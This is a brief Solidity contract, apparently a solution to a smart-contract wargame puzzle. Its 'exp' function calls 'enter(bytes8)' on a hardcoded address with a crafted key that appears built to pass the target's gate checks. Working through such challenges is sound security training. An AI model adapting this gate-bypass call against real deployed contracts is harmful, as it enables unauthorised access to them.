pragma solidity ^0.6.0;
contract sc{
    address addr=0x5e17b14ADd6c386305A32928F985b29bbA34Eff5;
    bytes8 key=0x000000010000ddc4;
    function exp() public {
        (bool success, bytes memory returnData) = address(addr).call(abi.encodeWithSignature("enter(bytes8)",key));
    }
}